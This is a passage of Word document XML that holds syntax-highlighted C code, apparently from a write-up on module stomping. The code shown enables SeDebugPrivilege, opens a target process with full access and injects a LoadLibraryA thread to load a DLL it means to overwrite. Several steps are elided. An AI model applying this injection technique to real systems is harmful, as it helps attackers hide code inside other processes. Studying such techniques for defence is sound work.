          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TCHAR</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">* targetProcessName = </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[1];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664FBF7C" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TCHAR</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">* targetModuleName = </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[2];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C71EA51" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DWORD</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> targetPid = getPIDForProcessByName(targetProcessName);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5936D8FA" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (targetPid == 0) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282EC776" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25A6CF23" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// Enable SeDebugPrivilege, which we require in order to inject a thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B654051" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!EnableDebugPrivilege(</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TRUE</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46612BA8" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D4A9C5" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// Open the target process so we can manipulate it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3181A6F6" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>HANDLE</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> toScanHandle = OpenProcess(</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROCESS_QUERY_INFORMATION</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROCESS_VM_READ</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROCESS_ALL_ACCESS</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FALSE</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, targetPid);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EEEE47" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (toScanHandle == </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A37FB80" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60B831F1" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:r w:rsidR="003555DB" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">onvince the target to load the library we're going to stomp on top of. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1560DF97" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:r w:rsidR="00E20B02" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>We just inject a thread to LoadLibraryA.</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> This process is omitted for brevity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406E730E" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>const</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">* moduleToStompFilename = </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"windowscodecsraw.dll"</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6840B9B3" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>void</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>* moduleToStompBase = injectLoadLibrary(toScanHandle, moduleToStompFilename);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1620EB29" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
